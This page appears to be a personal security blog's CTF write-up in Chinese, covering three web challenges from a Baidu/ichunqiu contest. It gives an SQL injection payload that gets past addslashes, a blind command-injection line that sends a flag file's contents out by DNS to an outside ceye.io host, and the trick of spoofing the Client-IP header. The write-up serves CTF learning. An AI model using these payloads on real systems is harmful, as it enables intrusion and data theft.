@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="x-man" />
+
+
+
+<meta name="description" content="WriteUp for Baidu on ichunqiu,10月15号">
+<meta property="og:type" content="article">
+<meta property="og:title" content="baidu-CTF-10月-第二场">
+<meta property="og:url" content="http://yoursite.com/2016/11/15/baidu-CTF-10月-第二场/index.html">
+<meta property="og:site_name" content="x-man's blog">
+<meta property="og:description" content="WriteUp for Baidu on ichunqiu,10月15号">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-second/1.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-second/2.png">
+<meta property="og:image" content="http://yoursite.com/img/ctf/baiductf-10-second/3.png">
+<meta property="og:updated_time" content="2016-11-15T10:59:49.291Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="baidu-CTF-10月-第二场">
+<meta name="twitter:description" content="WriteUp for Baidu on ichunqiu,10月15号">
+<meta name="twitter:image" content="http://yoursite.com/img/ctf/baiductf-10-second/1.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="x-man&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>baidu-CTF-10月-第二场 | x-man&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">x-man</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">为伊消得人憔悴</p>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ajax/">Ajax</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nginx/">Nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XMLHttpRequest/">XMLHttpRequest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/baidu/">baidu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/blog/">blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hmm/">hmm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ichunqiu/">ichunqiu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lua/">lua</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入，报错注入/">sql注入，报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/thread/">thread</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechall/">wechall</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/浏览器安全/">浏览器安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/绕过/">绕过</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/面试/">面试</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于web安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">x-man</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">x-man</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">为伊消得人憔悴</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-baidu-CTF-10月-第二场" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/11/15/baidu-CTF-10月-第二场/" class="article-date">
+      <time datetime="2016-11-15T07:50:29.000Z" itemprop="datePublished">2016-11-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      baidu-CTF-10月-第二场
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/baidu/">baidu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ichunqiu/">ichunqiu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="VId"><a href="#VId" class="headerlink" title="VId"></a>VId</h2><p>查看源代码，可以得到index.php.txt,访问便得到了如下代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line">Finding entry points</div><div class="line">Branch analysis from position: 0</div><div class="line">Jump found. Position 1 = 23, Position 2 = 38</div><div class="line">Branch analysis from position: 23</div><div class="line">Jump found. Position 1 = 26, Position 2 = 35</div><div class="line">Branch analysis from position: 26</div><div class="line">Jump found. Position 1 = 29, Position 2 = 32</div><div class="line">Branch analysis from position: 29</div><div class="line">Jump found. Position 1 = 34</div><div class="line">Branch analysis from position: 34</div><div class="line">Jump found. Position 1 = 37</div><div class="line">Branch analysis from position: 37</div><div class="line">Jump found. Position 1 = 40</div><div class="line">Branch analysis from position: 40</div><div class="line">Return found</div><div class="line">Branch analysis from position: 32</div><div class="line">Jump found. Position 1 = 37</div><div class="line">Branch analysis from position: 37</div><div class="line">Branch analysis from position: 35</div><div class="line">Jump found. Position 1 = 40</div><div class="line">Branch analysis from position: 40</div><div class="line">Branch analysis from position: 38</div><div class="line">Return found</div><div class="line">filename:       C:\ctf\index.php</div><div class="line">function name:  (null)</div><div class="line">number of ops:  44</div><div class="line">compiled vars:  !0 = $a, !1 = $b, !2 = $c</div><div class="line">line     # *  op                           fetch          ext  return  operands</div><div class="line">---------------------------------------------------------------------------------</div><div class="line">   2     0  &gt;   EXT_STMT</div><div class="line">         1      ECHO                                                     &apos;do+you+know+Vulcan+Logic+Dumper%3F%3Cbr%3E&apos;</div><div class="line">   3     2      EXT_STMT</div><div class="line">         3      BEGIN_SILENCE                                    ~0</div><div class="line">         4      FETCH_R                      global              $1      &apos;_GET&apos;</div><div class="line">         5      FETCH_DIM_R                                      $2      $1, &apos;flag1&apos;</div><div class="line">         6      END_SILENCE                                              ~0</div><div class="line">         7      ASSIGN                                                   !0, $2</div><div class="line">   4     8      EXT_STMT</div><div class="line">         9      BEGIN_SILENCE                                    ~4</div><div class="line">        10      FETCH_R                      global              $5      &apos;_GET&apos;</div><div class="line">        11      FETCH_DIM_R                                      $6      $5, &apos;flag2&apos;</div><div class="line">        12      END_SILENCE                                              ~4</div><div class="line">        13      ASSIGN                                                   !1, $6</div><div class="line">   5    14      EXT_STMT</div><div class="line">        15      BEGIN_SILENCE                                    ~8</div><div class="line">        16      FETCH_R                      global              $9      &apos;_GET&apos;</div><div class="line">        17      FETCH_DIM_R                                      $10     $9, &apos;flag3&apos;</div><div class="line">        18      END_SILENCE                                              ~8</div><div class="line">        19      ASSIGN                                                   !2, $10</div><div class="line">   6    20      EXT_STMT</div><div class="line">        21      IS_EQUAL                                         ~12     !0, &apos;fvhjjihfcv&apos;</div><div class="line">        22    &gt; JMPZ                                                     ~12, -&gt;38</div><div class="line">   7    23  &gt;   EXT_STMT</div><div class="line">        24      IS_EQUAL                                         ~13     !1, &apos;gfuyiyhioyf&apos;</div><div class="line">        25    &gt; JMPZ                                                     ~13, -&gt;35</div><div class="line">   8    26  &gt;   EXT_STMT</div><div class="line">        27      IS_EQUAL                                         ~14     !2, &apos;yugoiiyhi&apos;</div><div class="line">        28    &gt; JMPZ                                                     ~14, -&gt;32</div><div class="line">   9    29  &gt;   EXT_STMT</div><div class="line">        30      ECHO                                                     &apos;the+next+step+is+xxx.zip&apos;</div><div class="line">  10    31    &gt; JMP                                                      -&gt;34</div><div class="line">  11    32  &gt;   EXT_STMT</div><div class="line">        33      ECHO                                                     &apos;false%3Cbr%3E&apos;</div><div class="line">  13    34  &gt; &gt; JMP                                                      -&gt;37</div><div class="line">  14    35  &gt;   EXT_STMT</div><div class="line">        36      ECHO                                                     &apos;false%3Cbr%3E&apos;</div><div class="line">  16    37  &gt; &gt; JMP                                                      -&gt;40</div><div class="line">  17    38  &gt;   EXT_STMT</div><div class="line">        39      ECHO                                                     &apos;false%3Cbr%3E&apos;</div><div class="line">  19    40  &gt;   NOP</div><div class="line">  22    41      EXT_STMT</div><div class="line">        42      ECHO                                                     &apos;%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A&apos;</div><div class="line">        43    &gt; RETURN                                                   1</div><div class="line">branch: #  0; line:     2-    6; sop:     0; eop:    22; out1:  23; out2:  38</div><div class="line">branch: # 23; line:     7-    7; sop:    23; eop:    25; out1:  26; out2:  35</div><div class="line">branch: # 26; line:     8-    8; sop:    26; eop:    28; out1:  29; out2:  32</div><div class="line">branch: # 29; line:     9-   10; sop:    29; eop:    31; out1:  34</div><div class="line">branch: # 32; line:    11-   13; sop:    32; eop:    33; out1:  34</div><div class="line">branch: # 34; line:    13-   13; sop:    34; eop:    34; out1:  37</div><div class="line">branch: # 35; line:    14-   16; sop:    35; eop:    36; out1:  37</div><div class="line">branch: # 37; line:    16-   16; sop:    37; eop:    37; out1:  40</div><div class="line">branch: # 38; line:    17-   19; sop:    38; eop:    39; out1:  40</div><div class="line">branch: # 40; line:    19-   22; sop:    40; eop:    43</div><div class="line">path #1: 0, 23, 26, 29, 34, 37, 40,</div><div class="line">path #2: 0, 23, 26, 32, 34, 37, 40,</div><div class="line">path #3: 0, 23, 35, 37, 40,</div><div class="line">path #4: 0, 38, 40,</div><div class="line">do you know Vulcan Logic Dumper?&lt;br&gt;false&lt;br&gt;&lt;!-- index.php.txt ?&gt;</div></pre></td></tr></table></figure></p>
+<p>形似汇编，阅读发现要输入三个参数，flag1=fvhjjihfcv&amp;flag2=gfuyiyhioyf&amp;flag3=yugoiiyhi<br>传递参数到index.php,得到1chunqiu.zip，下载下来<br>查看，login.php中把username给转义了，接着进行了奇怪的替换操作，$username = trim(str_replace($number, ‘’, $username));，并且判断￥number是否是数字<br>payload:<code>Number=0&amp;username=test%00’%23</code><br>经过转义，变成了<code>Number=0&amp;username=test\0\’%23</code>，addslashes()函数会对%00进行转义，%00被前面添加\后变成了0<br>在替换其中的0得到：<code>Number=0&amp;username=test\\’%23</code>,逃逸出带引号，接下来便可以分段获取flag<br><img src="/img/ctf/baiductf-10-second/1.png" alt=""></p>
+<h2 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h2><p>查看源代码，发现编辑器是vim，应该有文件泄露，尝试访问.index.php.bak、.index.php.swo、.index.php.swp，会有waf拦截，直接在burp中把method改为post即可<br><img src="/img/ctf/baiductf-10-second/2.png" alt=""><br>把文件内容保存下来(burp,copy to file)，放到kali中恢复一下，执行vi -r .index.php.swp,得到代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;blind cmd exec&lt;/title&gt;</div><div class="line">&lt;meta language=&apos;utf-8&apos; editor=&apos;vim&apos;&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;img src=pic.gif&gt;</div><div class="line">&lt;?php</div><div class="line">/*</div><div class="line">flag in flag233.php</div><div class="line">*/</div><div class="line"> function check($number)</div><div class="line">&#123;</div><div class="line">        $one = ord(&apos;1&apos;);</div><div class="line">        $nine = ord(&apos;9&apos;);</div><div class="line">        for ($i = 0; $i &lt; strlen($number); $i++)</div><div class="line">        &#123;   </div><div class="line">                $digit = ord($number&#123;$i&#125;);</div><div class="line">                if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</div><div class="line">                &#123;</div><div class="line">                        return false;</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">        return $number == &apos;11259375&apos;;</div><div class="line">&#125;</div><div class="line">if(isset($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</div><div class="line">    setcookie(&apos;auth&apos;,&apos;tcp tunnel is forbidden!&apos;);</div><div class="line">    if(isset($_POST[&apos;cmd&apos;]))&#123;</div><div class="line">        $command=$_POST[cmd];</div><div class="line">        $result=exec($command);</div><div class="line">        //echo $result;</div><div class="line">    &#125;</div><div class="line">&#125;else&#123;</div><div class="line">    die(&apos;no sign&apos;);</div><div class="line">&#125;</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>参数sign不能含有数字且要等于11259375，把11259375转为十六进制即可，11259375==0xABCDEF<br>然后执行命令，利用dns来回显数据<br>cmd=ping -c 1 <code>sed -n &#39;2,2p&#39; flag233.php</code>.akyk7o.ceye.io      sed -n ‘2,2p’ flag233.php显示文件的第二行<br>或者 cmd=ping -c 1 <code>head -n 2 flag233.php | tail -n 1</code>.akyk7o.ceye.io<br>或者 cmd=ping -c 1 <code>awk -F&quot;\n&quot; &#39;{if(NR&gt;=2%26%26NR &lt;=2)print $0 }&#39; flag233.php</code>.akyk7o.ceye.io<br><img src="/img/ctf/baiductf-10-second/3.png" alt=""></p>
+<h2 id="Not-Found"><a href="#Not-Found" class="headerlink" title="Not Found"></a>Not Found</h2><p>burp拦截，查看响应包，看到X-Method: haha，这的意思是更改method试试，当改为options时得到location: ?f=1.php<br>这是一个文件读取啊， 但是发现只能读取1.php，经测试，可以读取.htaccess,发现8d829d8568e46455104209db5cd9228d.html<br>提示ip incorrect?XFF?，构造xff为127.0.0.1失败 然后用client-ip 获取flag</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/11/15/baidu-CTF-10月-第二场/">baidu-CTF-10月-第二场</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">x-man</a></p>
+        <p><span>发布时间:</span>2016-11-15, 15:50:29</p>
+        <p><span>最后更新:</span>2016-11-15, 18:59:49</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/11/15/baidu-CTF-10月-第二场/" title="baidu-CTF-10月-第二场">http://yoursite.com/2016/11/15/baidu-CTF-10月-第二场/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2016/11/15/baidu-CTF-10月-第二场/　　作者: x-man" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/11/15/baidu-CTF-10月-第三场/">
+                    baidu-CTF-10月-第三场
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/11/15/baidu-CTF-11月-第二场/">
+                    baidu-CTF-11月-第二场
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#VId"><span class="toc-number">1.</span> <span class="toc-text">VId</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXEC"><span class="toc-number">2.</span> <span class="toc-text">EXEC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Not-Found"><span class="toc-number">3.</span> <span class="toc-text">Not Found</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"baidu-CTF-10月-第二场　| x-man's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2016/11/15/baidu-CTF-10月-第二场/" data-title="baidu-CTF-10月-第二场" data-url="http://yoursite.com/2016/11/15/baidu-CTF-10月-第二场/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"x-man"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/11/15/baidu-CTF-10月-第三场/" title="上一篇: baidu-CTF-10月-第三场">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/11/15/baidu-CTF-11月-第二场/" title="下一篇: baidu-CTF-11月-第二场">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/baidu面试题整理/">baidu面试题整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/18/ssrf漏洞总结/">ssrf漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/17/hmm代码实现/">hmm代码实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/linux中的几个命令/">linux中的几个命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/python异常整理/">python异常整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/baidu-CTF-10月-第四场/">baidu-CTF-10月-第四场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/baidu-CTF-10月-第三场/">baidu-CTF-10月-第三场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/baidu-CTF-10月-第二场/">baidu-CTF-10月-第二场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/15/baidu-CTF-11月-第二场/">baidu-CTF-11月-第二场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/python集合总结/">python集合总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/lua学习笔记/">lua学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/02/requests模块整理/">requests模块整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/02/python变量作用域说明/">python变量作用域说明</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/01/python线程总结/">python线程总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/01/Nginx配置指令的执行顺序/">Nginx配置指令的执行顺序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/01/Nginx源码安装/">Nginx源码安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/Nginx内置的与http相关的变量/">Nginx内置的与http相关的变量</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/27/sql注入常用语句整理/">sql注入常用语句整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/python-执行系统命令/">python-执行系统命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/18/报错注入总结/">报错注入总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/18/sql-inject-attact-绕过/">sql-inject-attact-绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/浏览器本地文件读取及远程命令执行/">浏览器本地文件读取及远程命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/baidu-CTF-10月-第一场/">baidu-CTF-10月-第一场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/Nginx变量漫谈/">Nginx变量漫谈</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/baidu-CTF-3/">baidu CTF 3</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/baidu-CTF-2/">baidu CTF 2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/23/Ajax-Security/">Ajax Security</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/03/baidu-CTF-1/">baidu CTF 1</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/24/wechall-writeup-about-Crypto/">wechall writeup about Crypto</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/13/my-blog-is-ok/">my blog is ok</a></li><li 